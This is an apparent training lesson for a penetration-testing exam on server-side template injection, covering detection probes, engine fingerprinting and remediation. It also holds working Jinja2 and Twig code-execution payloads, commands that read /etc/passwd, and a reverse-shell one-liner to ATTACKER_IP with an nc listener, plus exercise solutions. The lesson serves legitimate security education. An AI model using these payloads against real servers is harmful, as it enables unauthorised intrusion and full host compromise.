@@ -1,0 +1,136 @@
+# Web Module — Lesson 5: Server-Side Template Injection (SSTI)
+
+**Methodology phase:** Exploitation → often a direct route to RCE.
+**Why it matters for PT1:** SSTI is the "advanced-looking but methodical" web vuln. It rewards the same discipline as SQLi and XSS — *prove data is being evaluated, identify the engine, then weaponise* — and it frequently hands you code execution outright, which is the win condition for the web section.
+
+---
+
+## 1. The concept
+
+Web apps use template engines to build pages: Jinja2 (Python/Flask), Twig (PHP), Freemarker (Java), and others. A template mixes static text with placeholders the engine evaluates:
+
+```python
+# Safe: name is passed as data
+render_template("hello.html", name=user_input)
+
+# Vulnerable: user input becomes part of the template string
+render_template_string("Hello " + user_input)
+```
+
+In the vulnerable case, if you send `{{7*7}}` and the page returns `Hello 49`, the engine **evaluated your input as template code**. Same root idea as every injection lesson: your data crossed into the code path. But here the "code" is the template language — and most template languages can reach the underlying OS.
+
+---
+
+## 2. Detection — the polyglot probe
+
+You don't yet know the engine, so send a probe that behaves differently across several:
+
+```
+${7*7}       {{7*7}}       <%= 7*7 %>       #{7*7}       ${{7*7}}
+```
+
+Look at what comes back:
+
+- `49` → arithmetic was evaluated → SSTI confirmed. Now identify the engine.
+- `7*7` (unchanged) → not evaluated → not SSTI (maybe XSS instead — different lesson).
+
+**Confirm it's server-side, not client-side.** `{{7*7}}=49` in the *raw HTTP response* (view source / curl) means the *server* evaluated it. If it only becomes 49 after JavaScript runs, that's client-side templating, a different bug.
+
+> **Why `{{7*7}}` and not `{{7+7}}`?** Multiplication avoids ambiguity — string concatenation could make `7+7` look like `77` in some engines, muddying the signal. `49` is unmistakable.
+
+---
+
+## 3. Fingerprint the engine
+
+The payload for RCE differs per engine, so identify it before firing. Use this decision probe:
+
+- `{{7*7}}` → `49` **and** `{{7*'7'}}` → `7777777` → **Jinja2** (Python). (Jinja repeats the string; Twig would error.)
+- `{{7*7}}` → `49` but `{{7*'7'}}` errors → likely **Twig** (PHP).
+- `${7*7}` → `49` → **Freemarker** or a Java engine.
+- `#{7*7}` → `49` → **Ruby** (ERB-style) engines.
+
+This mirrors the well-known PortSwigger SSTI decision tree — memorise the top two branches (Jinja2 and Twig), since those dominate CTF/exam targets.
+
+---
+
+## 4. Worked example — Jinja2 SSTI to RCE
+
+Room: **[TryHackMe — SSTI](https://tryhackme.com/room/learnssti)** (or the SSRF/SSTI content in the web path).
+
+**Step 1 — detect.** Input field reflects into a page. Send `{{7*7}}` → response shows `49`. SSTI confirmed.
+
+**Step 2 — fingerprint.** Send `{{7*'7'}}` → `7777777`. It's **Jinja2 / Python**.
+
+**Step 3 — reach the OS.** Jinja2 runs in a sandbox, so you climb Python's object model to find something that executes commands. The reliable modern payload:
+
+```python
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+```
+
+- `cycler` is a built-in object Jinja exposes.
+- `.__init__.__globals__` reaches the module globals where `cycler` was defined.
+- `.os` grabs the imported `os` module; `.popen('id').read()` runs the command and returns its output.
+
+If `cycler` isn't available, the classic longer chain walks from any string to a shell:
+```python
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+This lists every subclass loaded in the interpreter; you find the index of something like `subprocess.Popen` and call it. It's verbose — the `cycler`/`lipsum`/`request` shortcuts are cleaner when they exist.
+
+**Step 4 — from command output to shell.** Once `id` works, run a reverse-shell one-liner instead:
+```python
+{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
+```
+Catch it with `nc -lvnp 4444`. You now have a foothold, same as the file-upload route in Lesson 4.
+
+> **Dead end kept in:** my first RCE attempt used a `__subclasses__()` index copied from a blog. It threw an error because the subclass index is *interpreter-specific* — the number that points to `Popen` differs between targets. Lesson: don't paste magic indices. Either enumerate `__subclasses__()` on *this* target and find the right index, or use the `cycler`/`lipsum` globals shortcuts that don't depend on an index at all.
+
+---
+
+## 5. Twig (PHP) quick reference
+
+If fingerprinting says Twig, the RCE shape is different:
+```
+{{ ['id']|filter('system') }}
+{{ ['id',''] | sort('system') }}
+```
+Twig abuses PHP callback filters (`filter`, `sort`, `map`) to call `system`. Know that the *approach* changes with the engine — this is why Step 2 (fingerprint) is not optional.
+
+---
+
+## 6. Exercises
+
+**Exercise 1 — detect & confirm server-side.** Find an SSTI point. Prove the evaluation happens on the server (show `49` in the raw response, not just the rendered DOM).
+**Exercise 2 — fingerprint.** Using `{{7*'7'}}` and the `${}`/`#{}` probes, identify the engine. State the evidence that ruled the others out.
+**Exercise 3 — RCE.** Achieve command execution appropriate to the engine you identified. Read a file only the server user can (e.g. a flag or `/etc/passwd`).
+**Exercise 4 — chain + report.** Escalate to a reverse shell and write the finding, including why SSTI is typically Critical.
+
+---
+
+<details>
+<summary><b>Solutions & debrief</b></summary>
+
+**Exercise 1.** Send `{{7*7}}` and `curl` the endpoint (or view source). `49` present in the server's raw HTML = server-side evaluation. If it were only `49` after JS execution, it'd be client-side templating — note the distinction in your writeup.
+
+**Exercise 2.** `{{7*7}}`→`49` confirms a `{{ }}` engine (Jinja2 or Twig). `{{7*'7'}}`→`7777777` confirms **Jinja2** (Python string repetition); an error there would point to Twig. `${7*7}`/`#{7*7}` returning literal text rules out Freemarker/Ruby engines.
+
+**Exercise 3.** Jinja2: `{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}`. Twig: `{{ ['cat /etc/passwd']|filter('system') }}`. Adjust the command to the target's flag path.
+
+**Exercise 4 — model finding.**
+> **Title:** Remote code execution via server-side template injection (Critical).
+> **Endpoint:** `GET /greet`, `name` parameter (Jinja2/Flask).
+> **Reproduction:** `name={{7*7}}` returns `49`, confirming template evaluation. `name={{ cycler.__init__.__globals__.os.popen('id').read() }}` executes OS commands as the web user; a reverse-shell payload yields an interactive foothold.
+> **Impact:** Full remote code execution on the application server — complete compromise of the host and a pivot point into the network.
+> **Remediation:** Never render user input as part of a template string. Pass user data strictly as template *variables* (`render_template("t.html", name=x)`), use a sandboxed/logic-less template engine, and validate/encode input.
+
+</details>
+
+---
+
+## 7. Carry forward
+
+- SSTI is the same discipline as the rest of Web: prove evaluation (`{{7*7}}`), fingerprint the engine, then use the engine-specific RCE. Skipping the fingerprint is the #1 time-waster.
+- Don't paste magic `__subclasses__()` indices — they're target-specific. Prefer the globals shortcuts (`cycler`, `lipsum`, `request`).
+- SSTI usually means RCE, which usually means Critical. It's a high-value find on the exam.
+
+**Next lesson:** `web/06-burp-suite-workflow.md` — the tool that makes every lesson in this module faster, tied together into one repeatable web-testing workflow.
